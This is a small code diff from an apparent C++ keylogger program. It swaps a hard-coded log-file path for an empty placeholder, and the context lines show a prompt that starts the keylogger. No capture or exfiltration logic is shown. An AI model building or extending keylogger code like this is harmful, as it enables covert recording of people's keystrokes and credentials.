@@ -9,9 +9,9 @@ int keys(char key, fstream& file);
 fstream afile;
 
 void keylogger() {
-    // Path to the log file
-    const char* filePath = "C:\\Games\\cpp\\Project\\key_file.txt";  
-
+    // Enter your path to the log file 
+    const char* filePath = "";
+    
     char askForStart[2];
     cout << "Start keylogger (y/n): ";
     cin.getline(askForStart, 2);
